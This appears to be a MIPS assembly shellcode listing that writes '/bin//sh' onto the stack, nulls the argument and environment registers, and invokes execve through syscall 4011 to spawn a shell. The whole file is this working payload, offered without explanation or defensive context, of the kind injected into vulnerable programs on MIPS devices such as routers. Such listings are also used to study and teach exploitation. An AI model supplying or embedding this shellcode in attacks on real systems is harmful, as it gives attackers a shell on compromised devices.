.section .text
.global __start

__start:

    # execve("/bin//sh", NULL, NULL)

    lui $t1, 0x2f62 # /b
    ori $t1, 0x696e # in
    lui $t3, 0x2f2f # //
    ori $t3, 0x7368 # sh

    sw $t1, -0x10($sp)
    sw $t3, -0xc($sp)
    sw $zero, -0x8($sp)

    slti $a1, $zero, -1
    slti $a2, $zero, -1

    la $a0, -0x10($sp)

    li $v0, 4011 # SYS_execve
    syscall 0x040405
